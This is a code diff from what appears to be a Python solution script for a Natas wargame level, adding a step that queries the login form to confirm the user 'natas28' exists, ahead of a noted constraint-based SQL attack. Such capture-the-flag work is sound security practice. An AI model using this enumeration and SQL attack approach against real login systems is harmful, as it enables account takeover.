@@ -58,3 +58,18 @@ if(array_key_exists("username", $_REQUEST) and array_key_exists("password", $_RE
 
 # one attack that can be done here is Constraint-based SQL attack
 # reference: https://dhavalkapil.com/blogs/SQL-Attack-Constraint-Based/
+
+
+# firstly, we need to confirm that natas28 exists in the database
+params = {
+    "username" : "natas28",
+    "password" : "randompassword"
+}
+response = session.get(URL, params=params)
+div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
+print(f'{div_content}\n')
+# note that the above request returns the following
+"""
+Wrong password for user: natas28
+"""
+# thus, we confirmed that natas28 does exist in the database
